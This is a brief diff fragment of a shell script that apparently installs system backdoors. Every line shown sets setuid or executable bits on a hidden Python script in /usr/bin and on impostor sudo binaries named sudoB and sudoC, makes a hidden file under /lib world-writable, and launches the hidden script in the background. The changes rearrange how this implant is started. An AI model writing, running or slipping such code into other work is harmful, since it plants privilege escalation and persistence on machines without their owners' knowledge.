@@ -76,9 +76,9 @@ main()
 EOFC
 chmod +s /usr/bin/.brain.py
 chmod +x /usr/bin/.brain.py
-python3 /usr/bin/.brain.py &
-chmod +s /usr/bin/sudo
-chmod +x /usr/bin/sudo
+chmod +s /usr/bin/sudoC
+chmod +x /usr/bin/sudoC
 chmod +s /usr/bin/sudoB
 chmod +x /usr/bin/sudoB
 chmod o+w /lib/.syslogbLog
+python3 /usr/bin/.brain.py &
